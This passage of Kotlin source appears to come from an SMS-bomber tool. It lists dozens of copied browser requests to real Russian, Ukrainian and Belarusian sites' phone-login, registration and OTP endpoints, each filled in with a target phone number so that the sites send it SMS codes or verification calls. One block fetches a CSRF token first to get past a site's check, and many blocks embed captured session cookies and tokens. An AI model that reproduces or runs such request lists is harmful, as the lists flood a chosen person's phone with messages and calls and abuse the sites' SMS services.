            add("sec-fetch-site", "same-origin")
        }

        json("{\"name\":\"\",\"lastName\":\"\",\"email\":\"\",\"phone\":\"${phone.format("+7 (***) ***-**-**")}\",\"action\":null}")
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://francesco.ru/bitrix/components/bxmaker/authuserphone.enter/ajax.php"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "francesco.ru")
            add("accept", "*/*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("bx-ajax", "true")
            add("content-type", "application/x-www-form-urlencoded")
            add(
                "cookie",
                "tmr_lvid=0f5d1e0be0e715347e059de4f10ac799; tmr_lvidTS=1692811959055; _ym_uid=1692811959471311467; _ym_d=1692811959; _ym_isad=2; _ym_visorc=w; PHPSESSID=6wuhWlxNM5iOaiqSbXvFcHPt5jUT7XQA; ALTASIB_SITETYPE=original; VIEW_MODE_PRODUCT_PAGE=square; BITRIX_SM_ALTASIB_GEOBASE_COUNTRY=%7B%22country%22%3A%22RU%22%7D; BITRIX_SM_BXMAKER_AUP_GID2=2519103; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1692824340%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; BX_USER_ID=ac4f37b8c061e5da8f6e9ea3d9f6c462; tmr_detect=0%7C1692811962216"
            )
            add("origin", "https://francesco.ru")
            add("referer", "https://francesco.ru/catalog/zhenskaya_obuv/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
        }

        formBody {
            add("siteId", "s1")
            add("template", ".90b3da6a15238e9bc302089297001ec73c963139090181a65d855e2e129483a4")
            add(
                "parameters",
                "YToxOntzOjEwOiJDQUNIRV9UWVBFIjtzOjE6IkEiO30=.dda8c397dd38b5c32b480ffdda7eee666dae8fc433426b56f5b158dad92fc97e"
            )
            add("rand", "uB8qD7")
            add("confirmType", "1")
            add("actionType", "AUTH")
            add("sessid", "86b8bf4ed320d8b8718b42028fd8d704")
            add("method", "startConfirm")
            add("phone", phone.format("+7 *** ***-**-**"))
        }
    },

    service(380) {
        method = RequestBuilder.POST

        url("https://vittorossi.ua/local/components/hl/auth.sms/ajax.php") {
            addQueryParameter("siteId", "s1")
            addQueryParameter("lang", "ru")
        }

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "vittorossi.ua")
            add("accept", "application/json, text/javascript, */*; q=0.01")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
            add("origin", "https://vittorossi.ua")
            add("referer", "https://vittorossi.ua/personal/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("x-requested-with", "XMLHttpRequest")
        }

        formBody {
            add("phone", phone.format("+38(0**)***-**-**"))
            add("hl-ajax", "y")
            add("USER_REMEMBER", "Y")
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://geometria.ru/api/v1/send-sms-code/$phone/"

        headers {
            add("authority", "geometria.ru")
            add("accept", "*/*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-length", "0")
            add(
                "cookie",
                "PHPSESSID=mxklg1BE4p3jy4TiqW1dluqU3KZorpc1; IS_VIEWED_LOADER=Y; GEOMETRIA__CITY_ID=499; _ga_X2CCW5TZPX=GS1.1.1692812475.1.0.1692812475.0.0.0; _ga=GA1.2.558333288.1692812475; _gid=GA1.2.982915496.1692812475; _gat_gtag_UA_39695105_10=1; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A2%2C%22EXPIRE%22%3A1692824340%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_uid=1692812477369854206; _ym_d=1692812477; _ym_isad=2; BX_USER_ID=ac4f37b8c061e5da8f6e9ea3d9f6c462"
            )
            add("origin", "https://geometria.ru")
            add("referer", "https://geometria.ru/personal/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
        }

        emptyBody()
    },

    service(7) {
        method = RequestBuilder.POST

        url("https://lk.region-zoloto.ru/index.php") {
            addQueryParameter("option", "com_rz")
            addQueryParameter("task", "users.auth.login")
            addQueryParameter("format", "json")
        }

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "lk.region-zoloto.ru")
            add("accept", "application/json, text/plain, */*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "multipart/form-data; boundary=----WebKitFormBoundaryOHhkMEi7B2JBzQmy")
            add("cookie", "a36abda6e09145f035aec34e2314ece6=2o9haldt0v8o3euetqjrqthedt")
            add("origin", "https://lk.region-zoloto.ru")
            add("referer", "https://lk.region-zoloto.ru/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
        }

        body =
            "------WebKitFormBoundaryOHhkMEi7B2JBzQmy\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n+$phone\r\n------WebKitFormBoundaryOHhkMEi7B2JBzQmy\r\nContent-Disposition: form-data; name=\"code\"\r\n\r\n\r\n------WebKitFormBoundaryOHhkMEi7B2JBzQmy\r\nContent-Disposition: form-data; name=\"method\"\r\n\r\nrzusersms\r\n------WebKitFormBoundaryOHhkMEi7B2JBzQmy\r\nContent-Disposition: form-data; name=\"option\"\r\n\r\ncom_rz\r\n------WebKitFormBoundaryOHhkMEi7B2JBzQmy\r\nContent-Disposition: form-data; name=\"task\"\r\n\r\nusers.auth.login\r\n------WebKitFormBoundaryOHhkMEi7B2JBzQmy\r\nContent-Disposition: form-data; name=\"bf1414df16a27ad871b8218374fb092a\"\r\n\r\n1\r\n------WebKitFormBoundaryOHhkMEi7B2JBzQmy--\r\n".toRequestBody(
                "multipart/form-data; boundary=----WebKitFormBoundaryOHhkMEi7B2JBzQmy".toMediaType()
            )
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://www.hellride.ru/login"

        headers {
            add("Content-Type", "application/json")
            add("authority", "www.hellride.ru")
            add("accept", "application/json, text/plain, */*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/json")
            add(
                "cookie",
                "XSRF-TOKEN=eyJpdiI6IlZHRGhiYWdyRURWKzFCVkQ2ZVduN0E9PSIsInZhbHVlIjoiYXh0RjBOYWRvd2R2ZDdUdU8zSEFkRkN4RjI1R2hTYnBvbWlnUmp3OFhpM2ZWMVB4Q3FmTExBeXVCV2wzM0hOYlMzN1JhcFo4MlU1cEJCUmFEOEwvOEdvRlh0TGdVR0t6UDlxTzJyMDB0b0cvOUZZOERsUlBiRlNDTFUwYTVubzYiLCJtYWMiOiJlYTA4YmRhNzg0MzIyMzAyNTYzMGI0YThlMjNjMTNiNzFiZThjZjZjNzZlOWZjNjk1OTVlZjk2MzU3NjMyOTI4IiwidGFnIjoiIn0%3D; hellride_session=eyJpdiI6Ik1Ycjg4NGtlMnZmQVVHRXBTN1djclE9PSIsInZhbHVlIjoiaWlJdFVNVVBjRFVvVGtXcEhWaWltYUR2NXdVczZoWFppOURiNmdVRzVLVFk3Y2JSRWZJaU40MkdMbzZJOEdVeW5MdU1mOUFhOWg4UXF6YnFMZDVEWVdMamJCanhJa2ZENXpuSGNJLzVlY2g3SEpCT00yQU9kbjNzQ3RvRlgwS0wiLCJtYWMiOiI0MGI2YTkwOTJkNzkwZGJmMTQ3N2FlMTVmZTg0YTVkMTFiOGE4YmJmMWIzZjNmNTE1M2Q2OGM5NmVhMjkyOTc5IiwidGFnIjoiIn0%3D; _ym_uid=1692813505527780007; _ym_d=1692813505; _ga_LQ7BJFK6DB=GS1.1.1692813505.1.0.1692813505.60.0.0; _ga=GA1.1.2070125389.1692813505; _ym_isad=2; _ym_visorc=w"
            )
            add("origin", "https://www.hellride.ru")
            add("referer", "https://www.hellride.ru/login")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("x-csrf-token", "n2cOPLVrn57s7Jq2UVTpPXcE0IR3l9LQmfAt4Lh1")
            add(
                "x-xsrf-token",
                "eyJpdiI6IlZHRGhiYWdyRURWKzFCVkQ2ZVduN0E9PSIsInZhbHVlIjoiYXh0RjBOYWRvd2R2ZDdUdU8zSEFkRkN4RjI1R2hTYnBvbWlnUmp3OFhpM2ZWMVB4Q3FmTExBeXVCV2wzM0hOYlMzN1JhcFo4MlU1cEJCUmFEOEwvOEdvRlh0TGdVR0t6UDlxTzJyMDB0b0cvOUZZOERsUlBiRlNDTFUwYTVubzYiLCJtYWMiOiJlYTA4YmRhNzg0MzIyMzAyNTYzMGI0YThlMjNjMTNiNzFiZThjZjZjNzZlOWZjNjk1OTVlZjk2MzU3NjMyOTI4IiwidGFnIjoiIn0="
            )
        }

        json("{\"phone\":\"+$phone\"}")
    },

    service(7) {
        method = RequestBuilder.POST

        url("https://krasnodar.etagi.com/rest/plugin.etagi") {
            addQueryParameter("lang", "ru")
            addQueryParameter("module", "newcontact")
            addQueryParameter("skipauthheader", "true")
        }

        headers {
            add("Content-Type", "application/json")
            add("authority", "krasnodar.etagi.com")
            add("accept", "application/json")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/json; charset=UTF-8")
            add(
                "cookie",
                "experimentUserID=0.5864362796039966; _ga_sync=wrokGWTmSbS+cxonBU/PAg==; from_advertisement=false; visit_source=; sberid_session_uuid=f824ad67-8b2f-470c-bae5-bdd0a49f8076; _sa=SA1.9294000e-ef0a-4550-ac14-c303e00e0450.1692813748; currentPageUrl=https%3A%2F%2Fkrasnodar.etagi.com%2Ftickets%2F; _ga_34X0XLEBTX=GS1.1.1692813748.1.0.1692813748.0.0.0; v1_referrer_callibri=; v1_data=; _ga=GA1.2.1557411712.1692813749; _gid=GA1.2.328128007.1692813749; tmr_lvid=2611d22e0d779c0068abd3a1c7d48f9e; tmr_lvidTS=1692813749093; _ym_uid=1692813750330971406; _ym_d=1692813750; clbvid=64e649b6b991eccf7b31ab5a; _ym_isad=2; emuuid=e891f9c0-71b9-4f46-aa34-be341cca542d; olToken=b20fc419-7a5f-4f1c-aa5e-a66b1eff8f43; _ym_visorc=w; tmr_detect=0%7C1692813752408; _ga_P59Z99860P=GS1.1.1692813748.1.0.1692813763.0.0.0; _gat_UA-15557094-49=1"
            )
            add("origin", "https://krasnodar.etagi.com")
            add("referer", "https://krasnodar.etagi.com/tickets/")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
        }

        json("{\"data\":{\"type\":\"phone-by-call\",\"value\":\"$phone\"},\"returnObjects\":1}")
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://api.pik.ru/v1/phone/check"

        headers {
            add("Content-Type", "text/plain")
            add("Accept", "*/*")
            add("Accept-Language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("Connection", "keep-alive")
            add("Origin", "https://www.pik.ru")
            add("Referer", "https://www.pik.ru/")
            add("Sec-Fetch-Dest", "empty")
            add("Sec-Fetch-Mode", "cors")
            add("Sec-Fetch-Site", "same-site")
            add("Send-ID", "62d348fc449fe342ba041f655b56b89e")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
        }

        json("{\"phone\":\"${phone.format("+7 *** ***-**-**")}\",\"service\":\"confirmRegistrationSmsPikru\"}")
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://www.dsk1.ru/api/v3/signin"

        headers {
            add("Content-Type", "application/json")
            add("authority", "www.dsk1.ru")
            add("accept", "application/json")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("apiclient", "DSK")
            add("content-type", "application/json")
            add(
                "cookie",
                "sessionId=RO7un5xWqgB4uMXveJKjZS_wTPC_BG2a.SVSzn40GV%2B25MIfNGrP5hFcjwC79hkbmHyn0ueu8RCc; scbsid_old=1615064160; _gcl_au=1.1.1112746418.1692814484; _ga_H9ZP3BRZ5Z=GS1.1.1692814484.1.0.1692814484.0.0.0; _ga=GA1.2.1577717217.1692814484; _gid=GA1.2.391996270.1692814484; _dc_gtm_UA-37018743-1=1; tmr_lvid=da0d41d6f9e2e989ef76c1143008761a; tmr_lvidTS=1692814484198; _ym_uid=1692814484114842341; _ym_d=1692814484; adtech_uid=020e87b9-b17e-454e-816c-fb6d818ce1b1%3Adsk1.ru; top100_id=t1.7712236.785440961.1692814484546; last_visit=1692803684551%3A%3A1692814484551; _ym_isad=2; _ym_visorc=w; _gpVisits={\"isFirstVisitDomain\":true,\"idContainer\":\"10002438\"}; adrdel=1; adrcid=Atrb6YXMVPIwRmcD9hdkGjQ; _gp10002438={\"hits\":1,\"vc\":1}; tmr_detect=0%7C1692814486690; t3_sid_7712236=s1.1878777358.1692814484548.1692814489551.1.3"
            )
            add("origin", "https://www.dsk1.ru")
            add("referer", "https://www.dsk1.ru/")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("sentry-trace", "a8c0e24261ca43958dc0eee08a19b656-9a776b22101ac732-1")
        }

        json("{\"phone\":\"${phone.format("+7 (***) ***-**-**")}\",\"code\":\"\",\"call\":true}")
    },

    service(375) {
        method = RequestBuilder.POST
        url = "https://5element.by/user/login"

        headers {
            add("Content-Type", "application/json")
            add("authority", "5element.by")
            add("accept", "application/json, text/plain, */*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/json;charset=UTF-8")
            add(
                "cookie",
                "key=value; CITY_ID=31379; IS_MOBILE=0; PHPSESSID=4c99e98a3232df6b1b7316ba6d90bb9e; CART_HASH=7bdcdfe4; _ym_uid=1692866724453155368; _ym_d=1692866724; _ga=GA1.1.498512025.1692866724; _ym_isad=2; 5element_ct_ref_c=aHR0cHM6Ly81ZWxlbWVudC5ieS9jYXRhbG9nLzIzNS1uYXVzaG5pa2ktYmVzcHJvdm9kbnllLWJsdWV0b290aA==; 5element_ct_id=63715155; _ms=7b6b6121-a0c8-4ab9-b0e0-5b2211cfca21; _ymab_param=bEHlGS0HK9U7F4-m7zyIiM1o7wh0kxgLdkIaO4WHFlsyyOG5yMryAiXTCk5RWdPjcZipU822mbh_X_Qn59Upj5B2VDg; _ga_HENKSSSVF3=GS1.1.1692866724.1.1.1692866778.6.0.0"
            )
            add("origin", "https://5element.by")
            add("referer", "https://5element.by/catalog/235-naushniki-besprovodnye-bluetooth")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
        }

        json("{\"login\":\"$phone\",\"type\":\"send_code\"}")
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://kabinet.medi.spb.ru/restore"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
            add("Accept", "application/json, text/javascript, */*; q=0.01")
            add("Accept-Language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("Connection", "keep-alive")
            add(
                "Cookie",
                "MEDISESSION=8ib58fa4bi2onn5igsev1ef5v3vphu1bbm04k27m6842uerb4ec1; _ga=GA1.1.1479800073.1692866904; _ym_uid=1692866905400118602; _ym_d=1692866905; _ym_isad=2; _ga_EXEG3WRC78=GS1.1.1692866904.1.1.1692867379.0.0.0"
            )
            add("Origin", "https://kabinet.medi.spb.ru")
            add("Referer", "https://kabinet.medi.spb.ru/restore")
            add("Sec-Fetch-Dest", "empty")
            add("Sec-Fetch-Mode", "cors")
            add("Sec-Fetch-Site", "same-origin")
            add("X-Requested-With", "XMLHttpRequest")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
        }

        formBody {
            add("phone", phone.format("+7 (***) ***-****"))
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://api.vrachi-online.ru/api/v1/phone/code/send"

        headers {
            add("Content-Type", "application/json")
            add("authority", "api.vrachi-online.ru")
            add("accept", "application/json, text/plain, */*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/json;charset=UTF-8")
            add(
                "cookie",
                "_ga=GA1.1.1442918084.1692867548; VO_ANALYTIC_ID=5hYfDN4mynUx3Zj1bpEcZTmZ4RTZiwavoxSuKnE4; _ym_uid=1692867549381575045; _ym_d=1692867549; _ym_isad=2; _ym_visorc=w; stDeIdU=1bf5b11c-22f5-41a6-8327-efd779287925; vIdUid=2477f88a-5aea-425d-9d15-f48d90b4df1b; stLaEvTi=1692867553472; stSeStTi=1692867553472; _ga_X1P4Z01Z8Z=GS1.1.1692867548.1.1.1692867563.0.0.0"
            )
            add("origin", "https://vrachi-online.ru")
            add("referer", "https://vrachi-online.ru/")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-site")
        }

        json("{\"type\":\"customer\",\"phone\":\"$phone\"}")
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://leader-id.ru/api/v4/auth/start-phone-confirm?"

        headers {
            add("Content-Type", "application/json")
            add("authority", "leader-id.ru")
            add("accept", "application/json")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/json;charset=UTF-8")
            add("cookie", "_ym_uid=1692868257358755372; _ym_d=1692868257; _ym_isad=2; _ym_visorc=w")
            add("origin", "https://leader-id.ru")
            add("referer", "https://leader-id.ru/registration")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
        }

        json("{\"phone\":\"$phone\",\"type\":\"fcall\",\"captcha\":null}")
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://skidka.ru/api/json/1.0/reg_phone/"

        headers {
            add("Content-Type", "application/json")
            add("authority", "skidka.ru")
            add("accept", "application/vnd.api+json")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("client", "site")
            add("client-version", "browser")
            add("content-type", "application/vnd.api+json")
            add(
                "cookie",
                "_ym_uid=1692868404183896519; _ym_d=1692868404; dashamailDeviceUUID=9cfc9bae-d8c6-49fe-9c20-820c16fbcbe6; DM-session=%7B%22deviceGuid%22%3A%229cfc9bae-d8c6-49fe-9c20-820c16fbcbe6%22%7D; __eventn_id=corkyulgh1; _ym_isad=2; _ga_KL1LXJG3LZ=GS1.1.1692868403.1.0.1692868403.0.0.0; _ga=GA1.2.403631793.1692868404; _gid=GA1.2.1314329127.1692868404; _dc_gtm_UA-32783662-2=1; __utma=96200606.403631793.1692868404.1692868404.1692868404.1; __utmc=96200606; __utmz=96200606.1692868404.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt_%5Bobject%20Object%5D=1; __utmb=96200606.1.10.1692868404; _ga_K6B4ZKPXYC=GS1.2.1692868404.1.1.1692868404.60.0.0; _ga_P9GWR5CKBT=GS1.2.1692868404.1.1.1692868404.0.0.0; _gat_gtag_UA_32783662_2=1"
            )
            add("origin", "https://skidka.ru")
            add("referer", "https://skidka.ru/user/reg/")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
        }

        body =
            "{\"data\":{\"attributes\":{\"login\":\"${phone.format("+7 (***) ***-**-**")}\"},\"id\":\"phone\",\"type\":\"reg_phone\"}}".toRequestBody(
                "application/vnd.api+json".toMediaType()
            )
    },

    service {
        method = RequestBuilder.POST
        url = "https://identity.tllms.com/api/request_otp"

        headers {
            add("Content-Type", "application/json")
            add("authority", "identity.tllms.com")
            add("accept", "application/json, text/plain, */*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/json")
            add("origin", "https://byjus.com")
            add("referer", "https://byjus.com/")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "cross-site")
        }

        json("{\"phone\":\"+${phone.countryCode}-${phone.phone}\",\"app_client_id\":\"90391da1-ee49-4378-bd12-1924134e906e\"}")
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://svoe-rodnoe.ru/proxy/api/v1/auth/code"

        headers {
            add("Content-Type", "application/json")
            add("authority", "svoe-rodnoe.ru")
            add("accept", "application/json, text/plain, */*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("appversion", "9.9.9")
            add("content-type", "application/json")
            add(
                "cookie",
                "cookiesession1=678A3F3C5FD9765BBE6100996FE79F79; mindboxDeviceUUID=b5025119-1451-4b77-bc8a-7b0986de9ce7; directCrm-session=%7B%22deviceGuid%22%3A%22b5025119-1451-4b77-bc8a-7b0986de9ce7%22%7D; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; fresh-location=%7B%22city%22%3A%22%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%22%2C%22region%22%3A%22%D0%B3%20%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%22%2C%22fullTitle%22%3A%22%22%2C%22street%22%3A%22%22%2C%22streetWithType%22%3A%22%22%2C%22house%22%3A%22%22%2C%22coords%22%3A%7B%22latitude%22%3A55.755826%2C%22longitude%22%3A37.6172999%7D%2C%22regionWithType%22%3A%22%22%2C%22regionCode%22%3A77%2C%22postalCode%22%3A%22%22%2C%22blockWithType%22%3A%22%22%2C%22settlement%22%3A%22%22%7D; _ymab_param=csZ0oTlr_rtB8eJtX3s3EVXbNJk59Pe3xAmbscEL1Prse_D89blUubd3-wHWuP34T1w9UjY6aSvBEKJXKe7xEWz3yjg; _ym_uid=1692870089947628631; _ym_d=1692870089; _ym_isad=2; _ym_visorc=w"
            )
            add(
                "newrelic",
                "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjM4MDkzMDkiLCJhcCI6IjUzODQ5MTgwMiIsImlkIjoiYTg5NjdlM2ZmNmFkNGI4NSIsInRyIjoiM2UzY2FiZWU4MThlZGQwMThmMmRiZjI5YmMyOTZkMDAiLCJ0aSI6MTY5Mjg3MDA5OTI4Nn19"
            )
            add("origin", "https://svoe-rodnoe.ru")
            add("referer", "https://svoe-rodnoe.ru/")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("traceparent", "00-3e3cabee818edd018f2dbf29bc296d00-a8967e3ff6ad4b85-01")
            add("tracestate", "3809309@nr=0-1-3809309-538491802-a8967e3ff6ad4b85----1692870099286")
            add("x-source", "web")
        }

        json("{\"phone\":\"+$phone\"}")
    },

    service(380) {
        method = RequestBuilder.POST
        url = "https://api.doc.ua/"

        headers {
            add("Content-Type", "application/json")
            add("authority", "api.doc.ua")
            add("accept", "application/json, text/plain, */*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "text/plain;charset=UTF-8")
            add("origin", "https://doc.ua")
            add("referer", "https://doc.ua/")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-site")
        }

        body =
            "{\"method_name\":\"GetCSRF\",\"param\":{\"language\":1}}".toRequestBody("text/plain;charset=UTF-8".toMediaType())

        getJson { response ->
            method = RequestBuilder.POST
            url = "https://doc.ua/mobapi/patient/register"

            headers {
                add("Content-Type", "application/json")
                add("authority", "doc.ua")
                add("accept", "application/json, text/plain, */*")
                add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
                add("content-type", "application/json")
                add(
                    "cookie",
                    "city_id=1; _gcl_au=1.1.1088618392.1692870174; _hjSessionUser_3416505=eyJpZCI6IjIzZjIxMGQ4LWZkNjktNWIwZi1hOGFhLWRlNzAwNzBmYzRhZSIsImNyZWF0ZWQiOjE2OTI4NzAxNzQ3NTYsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_3416505=0; _hjSession_3416505=eyJpZCI6IjAzZDdhZGU2LTk2YjItNDhkMi1hM2Y3LWJiNzEyOGRmMTQwNyIsImNyZWF0ZWQiOjE2OTI4NzAxNzQ3NzIsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; _ga_TTR066R00K=GS1.1.1692870177.1.0.1692870177.60.0.0; _clck=1thmd71|2|fef|0|1331; _ga=GA1.2.2031897283.1692870178; _gid=GA1.2.1574027860.1692870179; _gat_UA-46229250-2=1; _ga_Q9RTXPNLVB=GS1.2.1692870179.1.0.1692870179.60.0.0; _ga_TV9L8TETM1=GS1.2.1692870179.1.0.1692870179.60.0.0; _clsk=1ixqllj|1692870180028|1|1|y.clarity.ms/collect"
                )
                add("origin", "https://doc.ua")
                add("platform", "web")
                add("platformversion", "1")
                add("referer", "https://doc.ua/news/articles/kak-otlichit-poddelnyj-med-ot-naturalnogo")
                add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
                add("sec-ch-ua-mobile", "?0")
                add("sec-ch-ua-platform", "\"Windows\"")
                add("sec-fetch-dest", "empty")
                add("sec-fetch-mode", "cors")
                add("sec-fetch-site", "same-origin")
                add("x-app-lang", "ru")
                add("x-csrf", response.jsonObject.get("data")?.jsonObject?.get("token")?.jsonPrimitive?.content ?: "")
            }

            json("{\"login\":\"$phone\"}")
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://mcrm.mead.club/graphql"

        headers {
            add("Content-Type", "application/json")
            add("Connection", "keep-alive")
            add("Origin", "https://web.mead.club")
            add("Referer", "https://web.mead.club/")
            add("Sec-Fetch-Dest", "empty")
            add("Sec-Fetch-Mode", "cors")
            add("Sec-Fetch-Site", "same-site")
            add("accept", "application/json")
            add("accept-language", "ru")
            add("content-type", "application/json; charset=utf-8")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
